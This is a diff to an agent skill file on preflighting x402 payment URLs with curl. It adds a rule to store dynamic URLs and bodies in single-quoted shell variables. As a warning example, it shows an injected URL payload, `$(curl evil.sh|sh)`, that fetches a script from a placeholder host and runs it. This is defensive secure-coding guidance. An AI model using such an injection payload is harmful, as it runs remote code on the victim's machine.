@@ -56,18 +56,32 @@ The merchant URL may come from the user, a catalog entry, or other less-trusted 
 - **Host:** reject targets that resolve to loopback (`127.0.0.0/8`, `::1`), private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local addresses (`169.254.0.0/16`, including the `169.254.169.254` cloud metadata endpoint), and other non-public/reserved ranges.
 - If the URL fails validation, stop and tell the user rather than curling it.
 
+### Shell-Safe Value Substitution — MANDATORY
+
+Scheme/host validation limits *where* the request can go; it does not stop shell metacharacters *inside* an otherwise-valid URL from being interpreted by the shell. **Never splice a dynamic value into a Bash command as bare text or inside double quotes** — double quotes still expand `$(...)`, backticks, and `$VAR`, so a URL like `https://api.example.com/?q=$(curl evil.sh|sh)` executes on substitution even quoted that way.
+
+Instead, assign the value to a shell variable as a **single-quoted literal** — single quotes store the bytes inertly, so nothing inside is expanded, even when the variable is referenced later — then reference the variable in double quotes (to prevent word-splitting, not to add safety):
+
+```bash
+MERCHANT_URL='<paste the exact URL, single-quoted, unmodified>'
+curl -s -w "\n%{http_code}" "$MERCHANT_URL"
+```
+
+If the value contains a single quote, escape each `'` as `'\''` (close the quote, insert an escaped literal quote, reopen the quote) before wrapping it — do not skip this for values from less-trusted sources (user-provided URLs, catalog entries, merchant response bodies). The same rule applies to the POST body below and to any other dynamic value (delegation JSON, poll URLs, approval URLs) substituted into a command anywhere in this skill family.
+
 ### How to Preflight
 
 Use `curl` to send a request to the merchant URL. Many x402-enabled services return a `402 Payment Required` response with payment requirement details:
 
 ```bash
-curl -s -w "\n%{http_code}" <MERCHANT_URL>
+curl -s -w "\n%{http_code}" "$MERCHANT_URL"
 ```
 
 Or for a POST endpoint:
 
 ```bash
-curl -s -w "\n%{http_code}" -X POST <MERCHANT_URL> -H "Content-Type: application/json" -d '<BODY>'
+BODY='<request body JSON, single-quoted, unmodified>'
+curl -s -w "\n%{http_code}" -X POST "$MERCHANT_URL" -H "Content-Type: application/json" -d "$BODY"
 ```
 
 The `-s` flag silences progress output. The `-w "\n%{http_code}"` appends the HTTP status code on a new line so you can distinguish the response body from the status.
